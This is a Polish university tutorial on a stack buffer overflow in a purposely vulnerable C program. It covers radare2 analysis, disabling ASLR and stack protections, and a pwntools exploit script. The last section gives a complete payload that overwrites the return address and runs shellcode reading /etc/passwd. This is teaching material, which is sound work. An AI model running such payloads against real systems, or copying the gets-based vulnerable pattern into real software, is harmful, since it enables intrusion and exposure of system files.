```license
MIT License

Copyright (c) 2019 Krzysztof 'RouNdeL' Zdulski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

# Eksploitacja binarna - 'buffer overflow'

## Potrzebne narzędzia
 - `gcc` (compiler)
 - `gdb` (debugger)
 - Python 2.7
   - `pip2` (do zaintslowania biblioteki)
   - biblioteka `pwntools`
 - `radare2`


## Plan tutoriala

1. Konfiguracja środowiska 
    1. Instalacja narzędzi
    2. Stworzenie podatnej aplikacji
2. Analiza i eksploitacja aplikacji za pomocą narzędzia `radare2`
    1. Uruchomienie `radare2`
    2. Analiza podatnej funkcji
    3. Stworzenie pliku z danymi wejściowymi
    4. Debuggowanie aplikacji
    5. Eksploitacja 
3. Wykorzystanie biblioteki `pwntools` i eksploitacja aplikacji za pomocą Pythona
    1. Podstawy 
    2. Eksploitacja i shellcode
    
## 1. Konfiguracja środowiska

### Instalacja narzędzi

W celu poprawnego wykonania tego modułu należy zainstalować Pythona w wersji 2.7.
Na systemach Linux bazujących na Debianie wystarczy użyć polecenia `sudo apt install python`.
Następnie instalujemy Package Installer for Python (pip), 
podobnie jak w przypadku Pythona wystarczy polecenie `sudo apt install python-pip`.
Jeśli instalacja przebiegła pomyślnie po wpisaniu polecenia `pip` powiniśmy otrzymać poniższą informację:

![pip usage](images/pip_usage.png)

`gcc` powinno być domyślnie zainstalowane na większości dystrybucji Linuxa, 
jednak jeśli nie jest, instalujemy pakiet _build-essentials_: `sudo apt install build-essential`.
Podobnie _gdb_: `sudo apt install gdb`.

### Stworzenie podatnej aplikacji

Na potrzeby tego modułu podatna aplikacja została już wcześniej napisana.
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void ask_for_name()
{
    char name[12] = {0};
    puts("What's your name?");
    gets(name);
    if(strlen(name) > 12) {
       puts("Nope, it's too long for me");
       exit(1);
    }
    printf("Hi %s!\n", name);
}

int main()
{
    ask_for_name();
    return 0;
}
```

Do skompliowania aplikacji używamy polecenia `gcc <source-file> -std=c99 -fno-stack-protector -z execstack -w -o <output-file>`. 
Te argumenty są potrzebne, by stos był wykonywalny (ang. executable).
Dodatkowo, wyłączamy losowe adresowanie przestrzeni wirtualnej, żeby adres stosu nie zmieniał się przy każdym wykonaniu programu. 
W tym celu wykonujemy polecenie `echo 0 > /proc/sys/kernel/randomize_va_space` - polecenie musi zostać wykonane z uprawnieniami *root*.

Podatność znajduje się w funkcji `void ask_for_name()` i spowodowana jest użyciem funckji `gets(char* str)`, która wczyta do bufora `char* name` dowolną ilość danych.
Następnie do sprawdzenia długości wprowadzonych danych wykorzystana jest funkcja `strlen (const char* str)`, 
którą bardzo łatwo oszukać, gdyż używa ona znaku _null_ (0x00 w ASCII) do sprawdzenia długości stringa.

## 2. Analiza aplikacji za pomocą narzędzia _radare2_

### Uruchomienie _radare2_

W celu rozpoczęcia analizy programu uruchamiamy _radare2_ poleceniem `radare2 <file>` lub krócej `r2 <file>`. 
Analizujemy wszystkie elementy pliku wpisując polecenie `aaa`. 

![](images/radare2_begin.png)

Jeśli chcecmy uzyskać więcej informacji o danym poleceniu lub możliwych poleceniach wpisujemy `?`. 
Wypisujemy wszytkie funkcje - `alf` (_analyze_ -> _functions_ -> _list_):

![](images/radare2_functions.png)

Widzimy, że _radare2_ znalazło m.in. funkcje `main` i `ask_for_name`. Program rozpoczyna wykonanie w `entry0`.
Widać również funkcje z biblioteki standardowej takie jak `put`, `gets`, `printf`, itp.

Żeby przejść do danej funkcji wpisujemy `s <function>`, np. `s sym.ask_for_name`.

![](images/radare2_seek.png)

Jak widać adres, w którym się znajdujemy zmienił się i jesteśmy teraz na początku funkcji `ask_for_name`.

### Analiza podatnej funkcji

Żeby wyświetlić zdeassemblowany kod funckji wpisujemy `pdf`.

![](images/radare2_asm_ask_for_name.png)

_radare2_ bardzo ułatwia nam czytanie kodu. Pokazały się stringi, które napisaliśmy w C,
jak również wykonania funkcji z biblioteki, a nawet przyjmowane przez nie argumenty oraz zwracane typy danych.
Na samej górze widzimy, że SP (stack pointer) przesuwany jest o 16 byteów. 
Pod adresem `0x000011b0` widać porównanie wartości zwróconej przez funckje `strlen` oraz stałej `0x0c` czyli 12 w systemie dziesiętnym. 
Kolejną instrukcją jest warunkowa instrukacja jump, która w połączeniu z poprzednią instrukcją `cmp` jest odpowiednikiem _ifa_ w C. 
Wpisując `VV` możemy przejść w tryb wyświetlający schemat blokowy naszej funckji.
Kilkając `p` możemy zmieniać sposób wyświetlania.

![](images/radare2_flow_graph.png)

Skoro już mniej więcej rozumiemy działanie funckji w assemblerze, możemy przejść do jej uruchomienia. Prześledzimy wtedy zachowanie rejestrów oraz stosu i spróbujemy wykorzytsać znalezioną podatność.

### Stworzenie pliku z danymi wejściowymi

Nasza apliakcja pobiera dane z wejścia standardowego _stdin_, 
żeby przekazać te dane z poziomu programu _radare2_ musimy umieścić przykładowe dane w pliku. `echo "Krzysztof" > stdin.bin`. 
Następnie należy utowrzyć plik konfiguracyjny _rarun2_ o dowolnej nazwie, np. `profile.rr2`.

```
#!/usr/bin/rarun2
stdin=./stdin.bin
```

### Debuggowanie aplikacji

W celu rozpoczęcia debugowania musimy zrestartować _rarun2_ w trybie debug. W tym celu należy zamknąć program, `q` lub `Ctrl+D`, 
a następnie uruchomić go z flagą `-d` - `r2 -e dbg.profile=<rarun2-file> -d <file>`.
Zauważmy, że w trybie debugowania zmieniły się adresy funckji, o czym zostaliśmy poinformowani przy uruchomieniu.

![](images/radare2_begin_debug.png)

Ustawiamy breakpoint (pułapkę) na samym początku funkcji `ask_for_name` - `db sym.ask_for_name`.

![](images/radare2_d_ask_for_name.png)

Widzimy, że przy pierwszej instrukcji pojawiło się **b** oznaczające ustawiony pod tym adresem breakpoint. 
Wznawiamy wykonanie programu używając polecenia `dc`, a następnie przechodzimy do interaktywnego trybu debugowania wpisując `V!`.
Teraz poza kodem assemblera widzimy również zawartość rejestrów oraz stosu. 

![](images/radare2_debugging.png)

Za pomocą `S` (`Shift+s`) przechodzimy do kolejnych instrukcji. 
Pojawi się wskaźnik `rip` pokazujący gdzie w danym momencie się znajdujemy.

Bezpośrednio po wykonaniu funckji `gets` dane z naszego pliku zostaną wczytane na stos.

![](images/radare2_d_after_gets1.png) ![](images/radare2_d_after_gets2.png)

Nasze dane nie były dłuższe niż 12 znaków, więc zmieściły się na stosie i spodziewamy się zaakceptowania danych przez program. 
Kontynuujemy debugowanie i faktycznie, program 'skacze' do fragmentu dotyczącego wyświetlenia poprawnej wiadomości. 

![](images/radare2_d_after_jmp.png)

Zmiana danych na dłuższe niż 12 znaków, np. `Krzysztof Zdulski` 
i analiza zachowania programu pozostawiona jest dla czytelnika w ramach ćwiczenia pracy z _radare2_.

### Eksploitacja 

Podczas analizy kodu funkcji `ask_for_name` zauwayliśmy, że do zweryfikowania długości wejścia wykorzystno funkcje `strlen`.
Funkcja ta kończy wykonanie gdy natrafi na _null character_, więc jesli w środku naszego wejścia umieścimy ten char, 
to funkcja zwróci mniejszą wartość. 

Zmieńmy zatem nasz plik wejściowy `echo -e "Krzysztof\x00This is a long message" > stdin.bin`. 
Zdebuggujmy nasz program jescze raz, tym razem breakpoint możemy ustawić zaraz po wykonaniu funckji `gets` - `db sym.ask_for_name+47`.

Widzimy, że cała wartość umieszczona została na stosie, a pod adresem `0x0x7fffffffe1cd` znajduje się podany przez nas `null character`. 

![](images/radare2_e_long_stack.png)

Po wykonaniu funkcji `strlen` zwrócona wartość znajduje się w resjestrze `rax` i jest to 9.

![](images/radare2_e_long_registers.png)

Udało nam się oszukać program, zaakceptował on nasze wejście. 
Kontynuujemy debugowanie, pomyślnie wyświetlamy wiadomość 'Hi Krzysztof!'. Zatrzymajmy się tuż przed instrukcją `leave`.
Instrukcja ta przesunie naszą ramkę stosu oraz wczyta wartość do rejestru `rbp`. 
Wykonujemy kolejny krok i widzimy, że to `rbp` została wczytana wartość `0x2061207369207369`.

![](images/radare2_e_long_rbp.png)

Po odwróceniu i zapisaniu w ASCII odpowiada to "is is a ", czyli jesteśmy w stanie zmienić wartość rejestru `rbp`,
a zatem i `rip`, ponieważ instrukacja `ret` wczyta adres za `rbp` to rejestru `rip`.
Ponieważ wyłączyliśmy losowe adresy przestrzeni wirtualnej wiemy, że adres stosu zawsze bedzie taki sam, 
w naszym przypadku `0x7fffffffe1e0`.
Wiemy, że jesteśmy w stanie manipulować rejestrem `rbp` oraz znajdującym się za nim rejestrem `rip`. 
Wystraczy więc ustawić `rip` na adres stosu, żeby móc wykonać nasz własny kod.
Adres poprzedniej ramki w tym momencie nie ma już znaczenia.

`echo -e "Krzysztof\x00\x00\x00This-rbp\xa0\xe1\xff\xff\xff\x7f\x00\x00" > stdin.bin`

Udało nam się ustawić Instruction Pointer (rejestr `rip`) na adres stosu, do którego mamy bezpośredni dostęp.

![](images/radare2_e_rip_at_stack.png)

W kolejnej części za pomocą Pythona i biblioteki _pwntools_ wyślemy shellcode, który zostanie wykonany przez nasz program.

## 3. Wykorzystanie biblioteki _pwntools_ i eksploitacja aplikacji za pomocą Pythona

### Podstawy

Wpierw utwórzmy plik o dowolnej nazwie w tym samym folderze, co exploiotwana przez nas aplikacja.
Dodajmy prawo do wykonania: `chmod +x <filename>`.

`exploit.py`:
```python
#!/bin/env python
from pwn import *

# Uruchomienie programu
p = process("./bof");

# Czekamy na pytanie
p.readuntil("What's your name?\n")
# Teraz program czeka na wejscie
# === Tu wprowadzamy modyfikacje ===

payload = "Krzysztof"

# =================================
# Wysylamy dane
p.sendline(payload)
# ...i odbieramy odpowiedz programu
print(p.readall())
```

Uruchamiamy jak każdy wykonywalny plik na Linuxie `./exploit.py` lub za pomocą polecenie `python exploit.py`.

![](images/python_pwntools_begin.png)

### Eksploitacja i shellcode

Następnie korzystając z wiedzy zdobytej w trakcie analizy przy użyciu _radare2_ konstruujemy payload, np. shellcode do wyświetlenia zawartości pliku `/etc/passwd`. Źródło: https://www.exploit-db.com/exploits/39700

`payload = "Krzysztof\x00\x00\x00This-rbp\xa0\xe1\xff\xff\xff\x7f\x00\x00\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

Jeśli eksploitacja przebiegła pomyślnie powinniśmy otrzymać następujący rezultat:
![](images/exploit_etc_passwd_result.png)

Jeśli program się zcrashował możemy spróbować zdebugować nasz shellcode wykorzystując narzędzie _radare2_ lub _gdb_.

![](images/radare2_exploit_etc_passwd.png)

Powyżej widzimy, że nasz shellcode został poprawnie umieszczony na stosie.

![](images/radare2_exploit_etc_passwd_wrong_rip.png)

Ale skoczyliśmy do złego adresu. Możemy dodać do naszego payloadu instrukcje NOP (`0x90`) przed wykonaniem shellcode'u lub zweryfikować czy nasz adres powrotu jest poprawnie zamieniany.

## Podsumowanie

Udało nam się wykorzystać podatność programu i uruchomić w ramach tego programu nasz własny kod.
Zauważymy jednak, że żeby tego dokonać musieliśmy wyłączyćstos losowe przydzielanie adresów w przestrzeni wirtualnej
oraz skompilować program z różnymi flagami (m.in. wykonywalny stos). 
Eksploitacja binarna choć bardzo potężna zwykle nie jest prosta.
W normalnym środowisku nie będziemy znali adresu stosu (będzie on losowy, a program przecież nam go nie wyświetli).
Pomimo tych wszystkich zabezpieczeń i trudności co jakiś czas odkrywane są nowe podatności i exploity do nich.

**Tutorial napisany przez Krzysztofa Zdulskiego w ramach przedmiotu WCYB.**
